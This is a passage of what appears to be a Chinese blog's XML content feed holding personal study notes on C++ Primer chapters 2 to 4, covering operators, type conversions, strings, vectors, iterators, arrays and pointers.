id="赋值运算符">赋值运算符</h2><ul><li>赋值运算的<strong>返回结果时它的左侧运算对象</strong>，且是一个左值。类型也就是左侧对象的类型。</li><li>如果赋值运算的左右侧运算对象类型不同，则右侧运算对象将转换成左侧运算对象的类型。</li><li>赋值运算符满足<strong>右结合律</strong>，这点和其他二元运算符不一样。 <code>ival = jval = 0;</code>等价于<code>ival = (jval = 0);</code></li><li>赋值运算优先级比较低，使用其当条件时应该加括号。</li><li>复合赋值运算符，<strong>复合运算符只求值一次</strong>，普通运算符求值两次。（对性能有一点点点点影响）<br>任意复合运算符op等价于<code>a = a op b;</code></li></ul><h2 id="递增递减运算符">递增递减运算符</h2><ul><li>前置版本<code>j = ++i</code>，先加一后赋值</li><li>后置版本<code>j = i++</code>，先赋值后加一</li></ul><p><strong>优先使用前置</strong>版本，后置多一步储存原始值。（除非需要变化前的值）</p><h3 id="混用解引用和递增运算符">混用解引用和递增运算符</h3><p><code>*iter++</code>等价于<code>*(iter++)</code>，递增优先级较高</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> iter = vi.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span> (iter!=vi.<span class="built_in">end</span>()&amp;&amp;*iter&gt;=<span class="number">0</span>)</span><br><span class="line">cout&lt;&lt;*iter++&lt;&lt;endl;<span class="comment">// 输出当前值，指针向前移1</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>简介是一种美德</strong>，追求简洁能降低程序出错可能性</p></blockquote><h2 id="成员访问运算符">成员访问运算符</h2><p><code>ptr-&gt;mem</code>等价于<code>(*ptr).mem</code></p><p>注意<code>.</code>运算符优先级大于<code>*</code>，所以记得加括号</p><h2 id="条件运算符">条件运算符</h2><ul><li><p>条件运算符（<code>?:</code>）允许我们把简单的<code>if-else</code>逻辑嵌入到单个表达式中去，按照如下形式：<code>cond? expr1: expr2</code></p></li><li><p>可以嵌套使用，<strong>右结合律</strong>，从右向左顺序组合</p><ul><li><pre><code class="language-c++">finalgrade = (grade &gt; 90) ? &quot;high pass&quot;    : (grade &lt; 60) ? &quot;fail&quot; : &quot;pass&quot;;//等价于finalgrade = (grade &gt; 90) ? &quot;high pass&quot;    : （(grade &lt; 60) ? &quot;fail&quot; : &quot;pass&quot;）;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 输出表达式使用条件运算符记得加括号，条件运算符优先级太低。</span><br><span class="line"></span><br><span class="line">## 位运算符</span><br><span class="line"></span><br><span class="line">用于检查和设置二进制位的功能。</span><br><span class="line"></span><br><span class="line">- 位运算符是作用于**整数类型**的运算对象。</span><br><span class="line">- 二进制位向左移（`&lt;&lt;`）或者向右移（`&gt;&gt;`），移出边界外的位就被舍弃掉了。</span><br><span class="line">- 位取反（`~`）（逐位求反）、与（`&amp;`）、或（`|`）、异或（`^`）</span><br><span class="line"></span><br><span class="line">有符号数负值可能移位后变号，所以强烈建议**位运算符仅用于无符号数**。</span><br><span class="line"></span><br><span class="line">应用：</span><br><span class="line"></span><br><span class="line">```c++</span><br><span class="line">unsigned long quiz1 = 0;    // 每一位代表一个学生是否通过考试</span><br><span class="line">1UL &lt;&lt; 12;  // 代表第12个学生通过</span><br><span class="line">quiz1 |= (1UL &lt;&lt; 12);   // 将第12个学生置为已通过</span><br><span class="line">quiz1 &amp;= ~(1UL &lt;&lt; 12);  // 将第12个学生修改为未通过</span><br><span class="line">bool stu12 = quiz1 &amp; (1UL &lt;&lt; 12);   // 判断第12个学生是否通过</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><blockquote><p>位运算符使用较少，但是重载cout、cin大家都用过</p></blockquote><p>位运算符满足左结合律，优先级介于中间，使用时尽量加括号。</p><h2 id="sizeof运算符">sizeof运算符</h2><ul><li>返回一条表达式或一个类型名字所占的<strong>字节数</strong>。</li><li>返回的类型是 <code>size_t</code>的常量表达式。</li><li><code>sizeof</code>并不实际计算其运算对象的值。</li><li>两种形式：<ol><li><code>sizeof (type)</code>，给出类型名</li><li><code>sizeof expr</code>，给出表达式</li></ol></li><li>可用sizeof返回数组的大小</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ia[<span class="number">10</span>];</span><br><span class="line"><span class="comment">// sizeof(ia)返回整个数组所占空间的大小</span></span><br><span class="line"><span class="comment">// sizeof(ia)/sizeof(*ia)返回数组的大小</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span> sz = <span class="built_in">sizeof</span>(ia)/<span class="built_in">sizeof</span>(*ia);</span><br><span class="line"><span class="type">int</span> arr[sz];</span><br></pre></td></tr></table></figure><h2 id="逗号运算符">逗号运算符</h2><p>从左向右依次求值。</p><p>左侧求值结果丢弃，逗号运算符<strong>结果是右侧表达式</strong>的值。</p><h2 id="类型转换">类型转换</h2><h3 id="隐式类型转换">隐式类型转换</h3><blockquote><p>设计为尽可能避免损失精度，即转换为更精细类型。</p></blockquote><ul><li>比 <code>int</code>类型小的整数值先提升为较大的整数类型。</li><li>条件中，非布尔转换成布尔。</li><li>初始化中，初始值转换成变量的类型。</li><li>算术运算或者关系运算的运算对象有多种类型，要转换成同一种类型。</li><li>函数调用时也会有转换。</li></ul><h4 id="算术转换">算术转换</h4><h5 id="整型提升">整型提升</h5><ul><li>常见的char、bool、short能存在int就会转换成int，否则提升为<code>unsigned int</code></li><li><code>wchar_t,char16_t,char32_t</code>提升为整型中<code>int,long,long long ……</code>最小的，且能容纳原类型所有可能值的类型。</li></ul><h4 id="其他转换">其他转换</h4><blockquote><p>p143</p></blockquote><h3 id="显式类型转换（尽量避免）">显式类型转换（尽量避免）</h3><ul><li><p><strong>static_cast</strong>：任何明确定义的类型转换，只要不包含底层const，都可以使用。 <code>double slope = static_cast&lt;double&gt;(j);</code></p></li><li><p><strong>dynamic_cast</strong>：支持运行时类型识别。</p></li><li><p><strong>const_cast</strong>：只能改变运算对象的底层const，一般可用于去除const性质。 <code>const char *pc; char *p = const_cast&lt;char*&gt;(pc)</code></p><blockquote><p>只有其可以改变常量属性</p></blockquote></li><li><p><strong>reinterpret_cast</strong>：通常为运算对象的位模式提供低层次上的重新解释。</p></li></ul><h4 id="旧式强制类型转换">旧式强制类型转换</h4><p><code>type expr</code></p><h2 id="运算符优先级表">运算符优先级表</h2><blockquote><p>p147</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第3章 字符串、向量和数组</title>
      <link href="/2023/05/12/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch03/"/>
      <url>/2023/05/12/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch03/</url>
      
        <content type="html"><![CDATA[<h2 id="using声明">using声明</h2><ul><li>使用某个命名空间：例如 <code>using std::cin</code>表示使用命名空间<code>std</code>中的名字<code>cin</code>。</li><li>头文件中不应该包含<code>using</code>声明。这样使用了该头文件的源码也会使用这个声明，会带来风险。</li></ul><h2 id="string">string</h2><ul><li>标准库类型<code>string</code>表示可变长的字符序列。</li><li><code>#include &lt;string&gt;</code>，然后 <code>using std::string;</code></li><li><strong>string对象</strong>：注意，不同于字符串字面值。</li></ul><h3 id="定义和初始化string对象">定义和初始化string对象</h3><p>初始化<code>string</code>对象的方式：</p><table><thead><tr><th>方式</th><th>解释</th></tr></thead><tbody><tr><td><code>string s1</code></td><td>默认初始化，<code>s1</code>是个空字符串</td></tr><tr><td><code>string s2(s1)</code></td><td><code>s2</code>是<code>s1</code>的副本</td></tr><tr><td><code>string s2 = s1</code></td><td>等价于<code>s2(s1)</code>，<code>s2</code>是<code>s1</code>的副本</td></tr><tr><td><code>string s3(&quot;value&quot;)</code></td><td><code>s3</code>是字面值“value”的副本，除了字面值最后的那个空字符外</td></tr><tr><td><code>string s3 = &quot;value&quot;</code></td><td>等价于<code>s3(&quot;value&quot;)</code>，<code>s3</code>是字面值&quot;value&quot;的副本</td></tr><tr><td><code>string s4(n, 'c')</code></td><td>把<code>s4</code>初始化为由连续<code>n</code>个字符<code>c</code>组成的串</td></tr></tbody></table><ul><li>拷贝初始化（copy initialization）：使用等号<code>=</code>将一个已有的对象拷贝到正在创建的对象。</li><li>直接初始化（direct initialization）：通过括号给对象赋值。</li></ul><h3 id="string对象上的操作">string对象上的操作</h3><p><code>string</code>的操作：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>os &lt;&lt; s</code></td><td>将<code>s</code>写到输出流<code>os</code>当中，返回<code>os</code></td></tr><tr><td><code>is &gt;&gt; s</code></td><td>从<code>is</code>中读取字符串赋给<code>s</code>，字符串以空白分割，返回<code>is</code></td></tr><tr><td><code>getline(is, s)</code></td><td>从<code>is</code>中读取一行赋给<code>s</code>，返回<code>is</code></td></tr><tr><td><code>s.empty()</code></td><td><code>s</code>为空返回<code>true</code>，否则返回<code>false</code></td></tr><tr><td><code>s.size()</code></td><td>返回<code>s</code>中字符的个数</td></tr><tr><td><code>s[n]</code></td><td>返回<code>s</code>中第<code>n</code>个字符的引用，位置<code>n</code>从0计起</td></tr><tr><td><code>s1+s2</code></td><td>返回<code>s1</code>和<code>s2</code>连接后的结果</td></tr><tr><td><code>s1=s2</code></td><td>用<code>s2</code>的副本代替<code>s1</code>中原来的字符</td></tr><tr><td><code>s1==s2</code></td><td>如果<code>s1</code>和<code>s2</code>中所含的字符完全一样，则它们相等；<code>string</code>对象的相等性判断对字母的大小写敏感</td></tr><tr><td><code>s1!=s2</code></td><td>同上</td></tr><tr><td><code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>, <code>&gt;=</code></td><td>利用字符在字典中的顺序进行比较，且对字母的大小写敏感（对第一个不相同的位置进行比较）</td></tr></tbody></table><ul><li>string io：<ul><li>执行读操作<code>&gt;&gt;</code>：忽略掉开头的空白（包括空格、换行符和制表符），直到遇到下一处空白为止。</li><li><code>getline</code>：读取一整行，<strong>包括空白符</strong>。</li></ul></li><li><code>s.size()</code>返回的时<code>string::size_type</code>类型，记住是一个<strong>无符号</strong>类型的值，不要和<code>int</code>混用</li><li><code>s1+s2</code>使用时，保证至少一侧是string类型。<code>string s1 = &quot;hello&quot; + &quot;world&quot; // 错误，两侧均为字符串字面值</code></li><li><strong>字符串字面值和string是不同的类型。</strong></li></ul><h3 id="处理string对象中的字符">处理string对象中的字符</h3><ul><li><strong>ctype.h vs. cctype</strong>：C++修改了c的标准库，名称为去掉<code>.h</code>，前面加<code>c</code>。<blockquote><p>如c++版本为<code>cctype</code>，c版本为<code>ctype.h</code></p></blockquote><ul><li><strong>尽量使用c++版本的头文件</strong>，即<code>cctype</code></li></ul></li></ul><p><code>cctype</code>头文件中定义了一组标准函数：</p><table><thead><tr><th>函数</th><th>解释</th></tr></thead><tbody><tr><td><code>isalnum(c)</code></td><td>当<code>c</code>是字母或数字时为真</td></tr><tr><td><code>isalpha(c)</code></td><td>当<code>c</code>是字母时为真</td></tr><tr><td><code>iscntrl(c)</code></td><td>当<code>c</code>是控制字符时为真</td></tr><tr><td><code>isdigit(c)</code></td><td>当<code>c</code>是数字时为真</td></tr><tr><td><code>isgraph(c)</code></td><td>当<code>c</code>不是空格但可以打印时为真</td></tr><tr><td><code>islower(c)</code></td><td>当<code>c</code>是小写字母时为真</td></tr><tr><td><code>isprint(c)</code></td><td>当<code>c</code>是可打印字符时为真</td></tr><tr><td><code>ispunct(c)</code></td><td>当<code>c</code>是标点符号时为真</td></tr><tr><td><code>isspace(c)</code></td><td>当<code>c</code>是空白时为真（空格、横向制表符、纵向制表符、回车符、换行符、进纸符）</td></tr><tr><td><code>isupper(c)</code></td><td>当<code>c</code>是大写字母时为真</td></tr><tr><td><code>isxdigit(c)</code></td><td>当<code>c</code>是十六进制数字时为真</td></tr><tr><td><code>tolower(c)</code></td><td>当<code>c</code>是大写字母，输出对应的小写字母；否则原样输出<code>c</code></td></tr><tr><td><code>toupper(c)</code></td><td>当<code>c</code>是小写字母，输出对应的大写字母；否则原样输出<code>c</code></td></tr></tbody></table><ul><li>遍历字符串：使用<strong>范围for</strong>（range for）语句： <code>for (auto c: str)</code>，或者 <code>for (auto &amp;c: str)</code>使用引用直接改变字符串中的字符。 （C++11）</li><li><code>str[x]</code>,[]输入参数为<code>string::size_type</code>类型，给出<code>int</code>整型也会自动转化为该类型</li></ul><h2 id="vector">vector</h2><ul><li>vector是一个<strong>容器</strong>，也是一个类模板；</li><li><code>#include &lt;vector&gt;</code> 然后 <code>using std::vector;</code></li><li>容器：包含其他对象。</li><li>类模板：本身不是类，但可以<strong>实例化instantiation</strong>出一个类。 <code>vector</code>是一个模板， <code>vector&lt;int&gt;</code>是一个类型。</li><li>通过将类型放在类模板名称后面的<strong>尖括号</strong>中来指定<strong>类型</strong>，如<code>vector&lt;int&gt; ivec</code>。</li></ul><h3 id="定义和初始化vector对象">定义和初始化vector对象</h3><p>初始化<code>vector</code>对象的方法</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td><code>vector&lt;T&gt; v1</code></td><td><code>v1</code>是一个空<code>vector</code>，它潜在的元素是<code>T</code>类型的，执行默认初始化</td></tr><tr><td><code>vector&lt;T&gt; v2(v1)</code></td><td><code>v2</code>中包含有<code>v1</code>所有元素的副本</td></tr><tr><td><code>vector&lt;T&gt; v2 = v1</code></td><td>等价于<code>v2(v1)</code>，<code>v2</code>中包含<code>v1</code>所有元素的副本</td></tr><tr><td><code>vector&lt;T&gt; v3(n, val)</code></td><td><code>v3</code>包含了n个重复的元素，每个元素的值都是<code>val</code></td></tr><tr><td><code>vector&lt;T&gt; v4(n)</code></td><td><code>v4</code>包含了n个重复地执行了值初始化的对象</td></tr><tr><td><code>vector&lt;T&gt; v5&#123;a, b, c...&#125;</code></td><td><code>v5</code>包含了初始值个数的元素，每个元素被赋予相应的初始值</td></tr><tr><td><code>vector&lt;T&gt; v5=&#123;a, b, c...&#125;</code></td><td>等价于<code>v5&#123;a, b, c...&#125;</code></td></tr></tbody></table><ul><li>列表初始化： <code>vector&lt;string&gt; v&#123;&quot;a&quot;, &quot;an&quot;, &quot;the&quot;&#125;;</code> （C++11）</li></ul><h3 id="向vector对象中添加元素">向vector对象中添加元素</h3><ul><li><code>v.push_back(e)</code> 在尾部增加元素。</li></ul><h3 id="其他vector操作">其他vector操作</h3><p><code>vector</code>支持的操作：</p><table><thead><tr><th>操作</th><th>解释</th></tr></thead><tbody><tr><td><code>v.emtpy()</code></td><td>如果<code>v</code>不含有任何元素，返回真；否则返回假</td></tr><tr><td><code>v.size()</code></td><td>返回<code>v</code>中元素的个数</td></tr><tr><td><code>v.push_back(t)</code></td><td>向<code>v</code>的尾端添加一个值为<code>t</code>的元素</td></tr><tr><td><code>v[n]</code></td><td>返回<code>v</code>中第<code>n</code>个位置上元素的<strong>引用</strong></td></tr><tr><td><code>v1 = v2</code></td><td>用<code>v2</code>中的元素拷贝替换<code>v1</code>中的元素</td></tr><tr><td><code>v1 = &#123;a,b,c...&#125;</code></td><td>用列表中元素的拷贝替换<code>v1</code>中的元素</td></tr><tr><td><code>v1 == v2</code></td><td><code>v1</code>和<code>v2</code>相等当且仅当它们的元素数量相同且对应位置的元素值都相同</td></tr><tr><td><code>v1 != v2</code></td><td>同上</td></tr><tr><td><code>&lt;</code>,<code>&lt;=</code>,<code>&gt;</code>, <code>&gt;=</code></td><td>以字典顺序进行比较</td></tr></tbody></table><ul><li>范围<code>for</code>语句内不应该改变其遍历序列的大小。</li><li><code>vector</code>对象（以及<code>string</code>对象）的下标运算符，只能对确知已存在的元素执行下标操作，不能用于添加元素。</li></ul><h2 id="迭代器iterator">迭代器iterator</h2><ul><li>所有标准库容器都可以使用迭代器。</li><li>类似于指针类型，迭代器也提供了对对象的间接访问。</li></ul><h3 id="使用迭代器">使用迭代器</h3><ul><li><code>vector&lt;int&gt;::iterator iter</code>。</li><li><code>auto b = v.begin();</code>返回指向第一个元素的迭代器。</li><li><code>auto e = v.end();</code>返回指向最后一个元素的下一个（哨兵，尾后,one past the end）的迭代器（off the end）。</li><li>如果容器为空， <code>begin()</code>和 <code>end()</code>返回的是同一个迭代器，都是尾后迭代器。</li><li>使用解引用符<code>*</code>访问迭代器指向的元素。</li><li>养成使用迭代器和<code>!=</code>的习惯（泛型编程）。</li><li><strong>容器</strong>：可以包含其他对象；但所有的对象必须类型相同。</li><li><strong>迭代器（iterator）</strong>：每种标准容器都有自己的迭代器。<code>C++</code>倾向于用迭代器而不是下标遍历元素。</li><li><strong>const_iterator</strong>：只能读取容器内元素不能改变。</li><li><strong>箭头运算符</strong>： 解引用 + 成员访问，<code>it-&gt;mem</code>等价于 <code>(*it).mem</code></li><li><strong>谨记</strong>：但凡是使用了<strong>迭代器</strong>的循环体，都<strong>不要</strong>向迭代器所属的容器<strong>添加元素</strong>。</li></ul><p>标准容器迭代器的运算符:</p><table><thead><tr><th>运算符</th><th>解释</th></tr></thead><tbody><tr><td><code>*iter</code></td><td>返回迭代器<code>iter</code>所指向的<strong>元素的引用</strong></td></tr><tr><td><code>iter-&gt;mem</code></td><td>等价于<code>(*iter).mem</code></td></tr><tr><td><code>++iter</code></td><td>令<code>iter</code>指示容器中的下一个元素</td></tr><tr><td><code>--iter</code></td><td>令<code>iter</code>指示容器中的上一个元素</td></tr><tr><td><code>iter1 == iter2</code></td><td>判断两个迭代器是否相等</td></tr></tbody></table><h3 id="迭代器运算">迭代器运算</h3><p><code>vector</code>和<code>string</code>迭代器支持的运算：</p><table><thead><tr><th>运算符</th><th>解释</th></tr></thead><tbody><tr><td><code>iter + n</code></td><td>迭代器加上一个整数值仍得到一个迭代器，迭代器指示的新位置和原来相比向前移动了若干个元素。结果迭代器或者指示容器内的一个元素，或者指示容器尾元素的下一位置。</td></tr><tr><td><code>iter - n</code></td><td>迭代器减去一个整数仍得到一个迭代器，迭代器指示的新位置比原来向后移动了若干个元素。结果迭代器或者指向容器内的一个元素，或者指示容器尾元素的下一位置。</td></tr><tr><td><code>iter1 += n</code></td><td>迭代器加法的复合赋值语句，将<code>iter1</code>加n的结果赋给<code>iter1</code></td></tr><tr><td><code>iter1 -= n</code></td><td>迭代器减法的复合赋值语句，将<code>iter2</code>减n的加过赋给<code>iter1</code></td></tr><tr><td><code>iter1 - iter2</code></td><td>两个迭代器相减的结果是它们之间的距离，也就是说，将运算符右侧的迭代器向前移动差值个元素后得到左侧的迭代器。参与运算的两个迭代器必须指向的是同一个容器中的元素或者尾元素的下一位置。</td></tr><tr><td><code>&gt;</code>、<code>&gt;=</code>、<code>&lt;</code>、<code>&lt;=</code></td><td>迭代器的关系运算符，如果某迭代器</td></tr></tbody></table><ul><li><strong>difference_type</strong>：保证足够大以存储任何两个迭代器对象间的距离，可正可负。</li></ul><h2 id="数组">数组</h2><ul><li>相当于vector的低级版，<strong>长度固定</strong>。</li></ul><h3 id="定义和初始化内置数组">定义和初始化内置数组</h3><ul><li>初始化：<code>char input_buffer[buffer_size];</code>，长度必须是const表达式，或者不写，让编译器自己推断。</li><li>数组不允许直接赋值给另一个数组。</li></ul><h3 id="访问数组元素">访问数组元素</h3><ul><li>数组下标的类型：<code>size_t</code> 。</li><li>字符数组的特殊性：结尾处有一个空字符，如 <code>char a[] = &quot;hello&quot;;</code> 。</li><li>用数组初始化 <code>vector</code>： <code>int a[] = &#123;1,2,3,4,5&#125;; vector&lt;int&gt; v(begin(a), end(a));</code> 。</li></ul><h3 id="数组和指针">数组和指针</h3><ul><li>使用数组时，编译器一般会把它转换成指针。</li><li>标准库类型限定使用的下标必须是无符号类型，而内置的下标可以处理负值。</li><li><strong>指针访问数组</strong>：在表达式中使用数组名时，名字会自动转换成指向数组的第一个元素的指针。</li></ul><h2 id="C风格字符串">C风格字符串</h2><ul><li>从C继承来的字符串。</li><li>用空字符结束（<code>\0</code>）。</li><li>对大多数应用来说，使用标准库 <code>string</code>比使用C风格字符串更安全、更高效。</li><li>获取 <code>string</code> 中的 <code>cstring</code> ： <code>const char *str = s.c_str();</code> 。</li></ul><p>C标准库String函数，定义在<code>&lt;cstring&gt;</code> 中：</p><table><thead><tr><th>函数</th><th>介绍</th></tr></thead><tbody><tr><td><code>strlen(p)</code></td><td>返回<code>p</code>的长度，空字符不计算在内</td></tr><tr><td><code>strcmp(p1, p2)</code></td><td>比较<code>p1</code>和<code>p2</code>的相等性。如果<code>p1==p2</code>，返回0；如果<code>p1&gt;p2</code>，返回一个正值；如果<code>p1&lt;p2</code>，返回一个负值。</td></tr><tr><td><code>strcat(p1, p2)</code></td><td>将<code>p2</code>附加到<code>p1</code>之后，返回<code>p1</code></td></tr><tr><td><code>strcpy(p1, p2)</code></td><td>将<code>p2</code>拷贝给<code>p1</code>，返回<code>p1</code></td></tr></tbody></table><p><strong>尽量使用vector和迭代器，少用数组</strong></p><h2 id="多维数组">多维数组</h2><ul><li><strong>多维数组的初始化</strong>： `int ia[3][4] =</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> 《C++ Primer 5th》 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>第2章 变量和基本类型</title>
      <link href="/2023/05/05/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch02/"/>
      <url>/2023/05/05/C-%E3%80%8AC-Primer-5th%E3%80%8B-ch02/</url>
      
        <content type="html"><![CDATA[<p>任何常用的编程语言都具备一组公共的语法特征，最基本的特征包括：</p><ul><li>整型、字符型等内置类型</li><li>变量，用来为对象命名</li><li>表达式和语句，用于操作上述数据类型的具体值</li><li>if 或 while 等控制结构，有选择地执行一些语句或重复地执行一些语句</li><li>函数，用于定义可供随时调用的计算单元</li></ul><p>大多数编程语言通过两种方式来进一步补充其基本特征：</p><ul><li>自定义数据类型，实现对语言的扩展</li><li>将一些有用的功能封装成库函数</li></ul><h3 id="基本内置类型">基本内置类型</h3><p><strong>基本算数类型</strong>：</p><table><thead><tr><th>类型</th><th>含义</th><th>最小尺寸</th></tr></thead><tbody><tr><td><code>bool</code></td><td>布尔类型</td><td>8bits</td></tr><tr><td><code>char</code></td><td>字符</td><td>8bits</td></tr><tr><td><code>wchar_t</code></td><td>宽字符</td><td>16bits</td></tr><tr><td><code>char16_t</code></td><td>Unicode字符</td><td>16bits</td></tr><tr><td><code>char32_t</code></td><td>Unicode字符</td><td>32bits</td></tr><tr><td><code>short</code></td><td>短整型</td><td>16bits</td></tr><tr><td><code>int</code></td><td>整型</td><td>16bits (在32位机器中是32bits)</td></tr><tr><td><code>long</code></td><td>长整型</td><td>32bits</td></tr><tr><td><code>long long</code></td><td>长整型</td><td>64bits （是在C++11中新定义的）</td></tr><tr><td><code>float</code></td><td>单精度浮点数</td><td>6位有效数字</td></tr><tr><td><code>double</code></td><td>双精度浮点数</td><td>10位有效数字</td></tr><tr><td><code>long double</code></td><td>扩展精度浮点数</td><td>10位有效数字</td></tr></tbody></table><h3 id="如何选择类型">如何选择类型</h3><ul><li>1.当明确知晓数值不可能是负数时，选用无符号类型；</li><li>2.使用<code>int</code>执行整数运算。一般<code>long</code>的大小和<code>int</code>一样，而<code>short</code>常常显得太小。除非超过了<code>int</code>的范围，选择<code>long long</code>。</li><li>3.算术表达式中不要使用<code>char</code>或<code>bool</code>。</li><li>4.浮点运算选用<code>double</code>。</li></ul><h3 id="类型转换">类型转换</h3><ul><li>非布尔型赋给布尔型，初始值为0则结果为false，否则为true。</li><li>布尔型赋给非布尔型，初始值为false结果为0，初始值为true结果为1。</li></ul><h3 id="字面值常量">字面值常量</h3><ul><li>一个形如<code>42</code>的值被称作<strong>字面值常量</strong>（literal）。<ul><li>整型和浮点型字面值。</li><li>字符和字符串字面值。<ul><li>使用空格连接，继承自C。</li><li>字符字面值：单引号， <code>'a'</code></li><li>字符串字面值：双引号， <code>&quot;Hello World&quot;</code></li><li>分多行书写字符串。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std:cout&lt;&lt;<span class="string">&quot;wow, a really, really long string&quot;</span></span><br><span class="line">          <span class="string">&quot;literal that spans two lines&quot;</span> &lt;&lt;std::endl;</span><br></pre></td></tr></table></figure></li></ul></li><li>转义序列。<code>\n</code>、<code>\t</code>等。</li><li>布尔字面值。<code>true</code>，<code>false</code>。</li><li>指针字面值。<code>nullptr</code></li></ul></li></ul><blockquote><p>字符串型实际上时常量字符构成的数组，结尾处以<code>'\0'</code>结束，所以字符串类型实际上长度比内容多1。</p></blockquote><h2 id="变量">变量</h2><p><strong>变量</strong>提供一个<strong>具名</strong>的、可供程序操作的存储空间。   <code>C++</code>中<strong>变量</strong>和<strong>对象</strong>一般可以互换使用。</p><h3 id="变量定义（define）">变量定义（define）</h3><ul><li><strong>定义形式</strong>：类型说明符（type specifier） + 一个或多个变量名组成的列表。如<code>int sum = 0, value, units_sold = 0;</code></li><li><strong>初始化</strong>（initialize）：对象在创建时获得了一个特定的值。<ul><li><strong>初始化不是赋值！</strong>：</li><li>初始化 = 创建变量 + 赋予初始值</li><li>赋值 = 擦除对象的当前值 + 用新值代替</li><li><strong>列表初始化</strong>：使用花括号<code>&#123;&#125;</code>，如<code>int units_sold&#123;0&#125;;</code></li><li>默认初始化：定义时没有指定初始值会被默认初始化；<strong>在函数体内部的内置类型变量将不会被初始化</strong>。</li><li>建议初始化每一个内置类型的变量。</li></ul></li></ul><h3 id="变量的声明（declaration）-vs-定义（define）">变量的<strong>声明</strong>（declaration） vs <strong>定义</strong>（define）</h3><ul><li>为了支持分离式编译，<code>C++</code>将声明和定义区分开。<strong>声明</strong>使得名字为程序所知。<strong>定义</strong>负责创建与名字关联的实体。</li><li><strong>extern</strong>：只是说明变量定义在其他地方。</li><li>只声明而不定义： 在变量名前添加关键字 <code>extern</code>，如<code>extern int i;</code>。但如果包含了初始值，就变成了定义：<code>extern double pi = 3.14;</code></li><li>变量只能被定义一次，但是可以多次声明。定义只出现在一个文件中，其他文件使用该变量时需要对其声明。</li><li>名字的<strong>作用域</strong>（namescope）<code>&#123;&#125;</code><ul><li><strong>第一次使用变量时再定义它</strong>。</li><li>嵌套的作用域<ul><li>同时存在全局和局部变量时，已定义局部变量的作用域中可用<code>::reused</code>显式访问全局变量reused。</li><li><strong>但是用到全局变量时，尽量不适用重名的局部变量。</strong></li></ul></li></ul></li></ul><h4 id="变量命名规范">变量命名规范</h4><ol><li>需体现实际意义</li><li>变量名用小写字母</li><li>自定义类名用大写字母开头：Sales_item</li><li>标识符由多个单词组成，中间须有明确区分：student_loan或studentLoan，不要用studentloan。</li></ol><h2 id="左值和右值">左值和右值</h2><ul><li><strong>左值</strong>（l-value）<strong>可以</strong>出现在赋值语句的左边或者右边，比如变量；</li><li><strong>右值</strong>（r-value）<strong>只能</strong>出现在赋值语句的右边，比如常量。</li></ul><h2 id="复合类型">复合类型</h2><h3 id="引用">引用</h3><blockquote><p>一般说的引用是指的左值引用</p></blockquote><ul><li><strong>引用</strong>：引用是一个对象的别名，引用类型引用（refer to）另外一种类型。如<code>int &amp;refVal = val;</code>。</li><li>引用必须初始化。</li><li>引用和它的初始值是<strong>绑定bind</strong>在一起的，而<strong>不是拷贝</strong>。一旦定义就不能更改绑定为其他的对象</li></ul><h3 id="指针">指针</h3><blockquote><p>int *p;      //<strong>指向int型对象</strong>的指针</p></blockquote><ul><li><p>是一种 <code>&quot;指向（point to）&quot;</code>另外一种类型的复合类型。</p></li><li><p><strong>定义</strong>指针类型： <code>int *ip1;</code>，<strong>从右向左读有助于阅读</strong>，<code>ip1</code>是指向<code>int</code>类型的指针。</p></li><li><p>指针存放某个对象的<strong>地址</strong>。</p></li><li><p>获取对象的地址： <code>int i=42; int *p = &amp;i;</code>。 <code>&amp;</code>是<strong>取地址符</strong>。</p></li><li><p>指针的类型与所指向的对象类型必须一致（均为同一类型int、double等）</p></li><li><p>指针的值的四种状态：</p><ul><li>1.指向一个对象；</li><li>2.指向紧邻对象的下一个位置；</li><li>3.空指针；</li><li>4.无效指针。</li><li><blockquote><p><strong>对无效指针的操作均会引发错误，第二种和第三种虽为有效的，但理论上是不被允许的</strong></p></blockquote></li></ul></li><li><p>指针访问对象： <code>cout &lt;&lt; *p;</code>输出p指针所指对象的数据， <code>*</code>是<strong>解引用符</strong>。</p></li><li><p>空指针不指向任何对象。使用<code>int *p=nullptr;</code>来使用空指针。</p></li><li><blockquote><p>指针和引用的区别：引用本身并非一个对象，引用定义后就不能绑定到其他的对象了；指针并没有此限制，相当于变量一样使用。</p></blockquote></li><li><blockquote><p>赋值语句永远改变的是<strong>左侧</strong>的对象。</p></blockquote></li><li><p><code>void*</code>指针可以存放<strong>任意</strong>对象的地址。因无类型，仅操作内存空间，对所存对象无法访问。</p></li><li><p>其他指针类型必须要与所指对象<strong>严格匹配</strong>。</p></li><li><p>两个指针相减的类型是<code>ptrdiff_t</code>。</p></li><li><p>建议：初始化所有指针。</p></li><li><p><code>int* p1, 